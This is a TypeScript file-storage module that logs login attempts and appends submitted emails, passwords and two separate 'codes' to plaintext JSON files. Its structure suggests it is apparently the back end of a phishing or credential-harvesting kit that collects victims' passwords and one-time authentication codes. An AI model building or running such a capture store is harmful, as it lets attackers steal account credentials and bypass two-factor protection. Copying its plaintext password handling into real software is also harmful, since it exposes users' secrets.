import fs from "fs/promises";
import path from "path";
import { randomUUID } from "crypto";

// Use /app/data in production (Docker), or relative data/ in development
const dataDir = process.env.NODE_ENV === "production" 
  ? "/app/data"
  : path.join(process.cwd(), "data");

async function ensureDataDir() {
  try {
    await fs.access(dataDir);
  } catch {
    await fs.mkdir(dataDir, { recursive: true });
  }
}

async function readJson(fileName: string): Promise<any[]> {
  await ensureDataDir();
  const filePath = path.join(dataDir, fileName);
  try {
    const raw = await fs.readFile(filePath, "utf-8");
    return JSON.parse(raw || "[]");
  } catch (e) {
    return [];
  }
}

async function writeJson(fileName: string, data: any[]) {
  await ensureDataDir();
  const filePath = path.join(dataDir, fileName);
  await fs.writeFile(filePath, JSON.stringify(data, null, 2), "utf-8");
}

export interface IStorage {
  logLoginAttempt(attempt: any): Promise<any>;
  getLoginAttempts(): Promise<any[]>;
  clearLoginAttempts(): Promise<void>;
  saveEmailData(data: any): Promise<void>;
  savePasswordData(data: any): Promise<void>;
  saveFirstCodeData(data: any): Promise<void>;
  saveSecondCodeData(data: any): Promise<void>;
}

class FileStorage implements IStorage {
  async logLoginAttempt(insertAttempt: any) {
    const file = "login_attempts.json";
    const existing = await readJson(file);
    const item = {
      id: randomUUID(),
      timestamp: new Date().toISOString(),
      ...insertAttempt,
    };
    existing.push(item);
    await writeJson(file, existing);
    return item;
  }

  async getLoginAttempts() {
    return await readJson("login_attempts.json");
  }

  async clearLoginAttempts() {
    await writeJson("login_attempts.json", []);
  }

  async saveEmailData(data: any) {
    const file = "emails.json";
    const existing = await readJson(file);
    existing.push({ id: randomUUID(), timestamp: new Date().toISOString(), ...data });
    await writeJson(file, existing);
  }

  async savePasswordData(data: any) {
    const file = "passwords.json";
    const existing = await readJson(file);
    existing.push({ id: randomUUID(), timestamp: new Date().toISOString(), ...data });
    await writeJson(file, existing);
  }

  async saveFirstCodeData(data: any) {
    const file = "code.json";
    const existing = await readJson(file);
    existing.push({ id: randomUUID(), timestamp: new Date().toISOString(), ...data });
    await writeJson(file, existing);
  }

  async saveSecondCodeData(data: any) {
    const file = "codes.json";
    const existing = await readJson(file);
    existing.push({ id: randomUUID(), timestamp: new Date().toISOString(), ...data });
    await writeJson(file, existing);
  }
}

export const storage = new FileStorage();
